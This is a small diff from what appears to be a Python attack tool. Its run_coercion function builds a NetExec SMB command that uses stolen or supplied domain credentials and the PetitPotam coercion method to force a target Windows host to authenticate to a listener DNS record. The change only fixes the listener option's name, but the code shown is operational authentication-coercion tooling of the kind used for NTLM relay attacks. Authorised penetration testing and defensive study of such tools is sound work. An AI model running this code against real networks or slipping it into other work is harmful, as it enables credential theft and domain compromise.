@@ -969,7 +969,7 @@ def run_coercion(target_ip, domain, user, password, method="PetitPotam"):
         "-u", user,
         "-p", password,
         "-M", "coerce_plus",
-        "-o", f"M={method}", f"L={STATIC_DNS_RECORD}"
+        "-o", f"M={method}", f"LISTENER={STATIC_DNS_RECORD}"
     ]
     log("RPC", ">>", f"cmd: nxc smb {target_ip} -d {domain} -u {user} -M coerce_plus -o M={method} L=...")
 
